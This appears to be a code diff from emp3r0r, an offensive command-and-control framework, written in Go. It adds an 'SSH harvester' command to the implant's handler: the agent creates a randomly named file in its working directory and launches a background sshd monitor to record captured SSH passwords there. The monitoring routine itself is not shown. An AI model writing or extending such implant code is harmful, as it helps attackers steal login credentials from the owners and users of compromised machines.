@@ -10,6 +10,7 @@ import (
 	"strconv"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 func platformC2CommandsHandler(cmdSlice []string) (out string) {
@@ -28,6 +29,13 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 
 		helper := cmdSlice[1]
 		out = lpeHelper(helper)
+		return
+
+	case emp3r0r_data.C2CmdSSHHarvester:
+		passfile := fmt.Sprintf("%s/%s.txt",
+			RuntimeConfig.AgentRoot, util.RandStr(10))
+		out = fmt.Sprintf("Look for passwords in %s", passfile)
+		go sshd_monitor(passfile)
 		return
 
 		// GDB inject
